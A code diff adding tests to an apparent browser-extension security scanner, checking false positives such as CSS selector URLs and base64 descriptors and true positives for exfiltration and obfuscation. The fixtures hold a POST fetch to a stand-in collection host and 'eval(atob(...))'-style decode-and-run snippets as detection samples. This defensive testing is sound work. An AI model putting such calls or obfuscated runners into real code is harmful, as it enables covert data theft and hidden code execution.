@@ -93,6 +93,56 @@ class TestAbsoluteFindings:
         assert "skipped" in analyse_code(None, EXT_ID, "X", "1.0")["flags"][0]
 
 
+class TestRealExtensionFalsePositives:
+    """Shapes found in genuine Web Store extensions during the 2026-10-07 test."""
+
+    def test_urls_in_css_selectors_are_not_endpoints(self):
+        """uBlock Origin Lite: cosmetic filters that HIDE links, e.g.
+        [href^="https://royalwinindonesia1.pages.dev/"] - not destinations."""
+        code = (
+            'const css = "[href^=\\"https://royalwin.pages.dev/\\"],\\n'
+            '[href*=\'https://spam.workers.dev/x\'],[src=\\"https://ads.example.net/a\\"]";'
+        )
+        profile, _ = build_profile(make_zip({"rulesets/idn-0.js": code}), "1.0")
+        assert profile["exfil_endpoints"] == []
+        assert profile["hosts"] == []
+
+    def test_a_real_request_next_to_a_selector_still_counts(self):
+        code = (
+            'const css = "[href^=\\"https://hidden.pages.dev/\\"]";\n'
+            'fetch("https://collect.workers.dev/c", {method: "POST"});'
+        )
+        profile, _ = build_profile(make_zip({"bg.js": code}), "1.0")
+        assert profile["exfil_endpoints"] == ["collect.workers.dev"]
+
+    def test_long_base64_alone_is_not_obfuscation(self):
+        """Grammarly / Bitwarden embed protobuf descriptors as base64."""
+        code = 'const d=(0,r.w)("' + "Ci1zdXBlcmh1bWFu" * 40 + '");'
+        profile, _ = build_profile(make_zip({"bg.js": code}), "1.0")
+        assert profile["obfuscated_files"] == []
+
+    @pytest.mark.parametrize(
+        "runner",
+        ["eval(atob(p))", "new Function(atob(p))()", "eval(function(p,a,c,k,e,d){return p})"],
+    )
+    def test_long_base64_that_is_decoded_and_run_is_obfuscation(self, runner):
+        code = 'var p="' + "ZXZpbA" * 80 + '";' + runner
+        profile, _ = build_profile(make_zip({"bg.js": code}), "1.0")
+        assert profile["obfuscated_files"] == ["bg.js"]
+
+    def test_large_source_map_is_hashed_not_an_error(self):
+        """Bitwarden ships 10-12 MB .map files: not code, not 'unscanned code'."""
+        big_map = '{"version":3,"mappings":"' + "A" * (code_diff.MAX_FILE_BYTES + 1000) + '"}'
+        profile, errors = build_profile(make_zip({"bg.js.map": big_map, "bg.js": "x"}), "1.0")
+        assert errors == []
+        assert "bg.js.map" in profile["files"]
+
+    def test_oversized_code_file_is_still_reported(self):
+        huge = "var a=1;" * (code_diff.MAX_FILE_BYTES // 8 + 10)
+        _, errors = build_profile(make_zip({"bundle.js": huge}), "1.0")
+        assert any("bundle.js" in e for e in errors)
+
+
 class TestDiff:
     def test_hijacked_patch_update_is_flagged(self):
         """Review harness #6: 24.10.3 -> 24.10.4 with unchanged permissions was
